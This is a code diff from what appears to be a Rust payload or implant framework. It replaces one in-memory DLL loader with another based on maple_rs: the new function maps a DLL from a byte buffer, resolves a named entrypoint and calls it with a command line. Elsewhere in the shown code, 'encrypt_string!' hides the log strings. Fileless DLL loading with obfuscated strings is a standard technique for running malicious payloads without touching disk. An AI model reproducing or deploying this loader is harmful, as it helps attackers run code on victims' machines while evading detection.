@@ -11,16 +11,16 @@ use crate::payload_util::fail_linux_message;
 #[cfg(target_os = "linux")]
 use crate::payload_util::set_permission;
 
-#[cfg(target_os = "windows")]
-type DllEntryPoint = extern "C" fn(*const c_char); //type DllEntryPoint = extern "C" fn() -> c_int;
+//#[cfg(target_os = "windows")]
+//type DllEntryPoint = extern "C" fn(*const c_char); //type DllEntryPoint = extern "C" fn() -> c_int;
 #[cfg(target_os = "windows")]
 use crate::python_embedder;
 //#[cfg(target_os = "windows")]
 //use rspe::reflective_loader;
 #[cfg(target_os = "windows")]
 use std::ffi::CString;
-#[cfg(target_os = "windows")]
-use std::mem;
+//#[cfg(target_os = "windows")]
+//use std::mem;
 #[cfg(target_os = "windows")]
 use std::os::raw::c_char; //use std::os::raw::c_int;
 #[cfg(target_os = "windows")]
@@ -213,40 +213,33 @@ impl DLM {
 
 #[cfg(target_os = "windows")]
 pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandline: String) {
-    let dll_data: &[u8] = &data;
-    info!(
-        "{}",
-        encrypt_string!("Map DLL in memory (MemoryLoadLibrary)")
-    );
-    let mm = memorymodule_rs::MemoryModule::new(dll_data);
-    info!(
-        "{}{}{}",
-        encrypt_string!("Retreive DLL entrypoint: "),
-        &dll_entrypoint,
-        encrypt_string!(" via (MemoryGetProcAddress)"),
-    );
+    use maple_rs::MemoryModuleBuilder;
 
-    let dll_entry_point =
-        unsafe { mem::transmute::<_, DllEntryPoint>(mm.get_function(&dll_entrypoint)) };
-    info!(
-        "{}{}{}{}{}",
-        encrypt_string!("commandline for DLL."),
-        &dll_entrypoint,
-        encrypt_string!(".('"),
-        &dll_commandline,
-        encrypt_string!("')")
-    );
-    let c_commandline = CString::new(dll_commandline).unwrap_or_else(|e| {
-        error!("Error in CString conversion: {}", e);
-        // WARNING: unwrap and return empty. probably its better to return an error instead of something NULL.
-        CString::new("").unwrap()
-    });
-    info!("{}", encrypt_string!("dll_entry_point()"),);
-    let _result = dll_entry_point(c_commandline.as_ptr());
-    info!("{}", encrypt_string!("Drop DLL memory (MemoryFreeLibrary)"));
-    drop(mm);
-    info!("{}", encrypt_string!("DLM: end"));
+    let module = match MemoryModuleBuilder::new()
+        .resolve_imports(true)
+        .process_relocations(true)
+        .call_dll_main(true)
+        .load_from_memory(&data)
+    {
+        Ok(m) => m,
+        Err(e) => { error!("maple-rs failed: {:?}", e); return; }
+    };
+
+    let fn_ptr = match module.get_proc_address(&dll_entrypoint) {
+        Ok(p) => p,
+        Err(e) => { error!("entrypoint not found: {:?}", e); return; }
+    };
+
+    // Signature originale qui fonctionnait
+    type DllInstall = unsafe extern "C" fn(*const c_char);
+    let dll_install = unsafe { std::mem::transmute::<_, DllInstall>(fn_ptr) };
+
+    let c_cmd = CString::new(dll_commandline).unwrap();
+    let _result = unsafe { dll_install(c_cmd.as_ptr()) };
+
+    std::mem::forget(module);
 }
+
 
 #[derive(PartialEq, Serialize, Deserialize, Clone)]
 pub struct EPY {
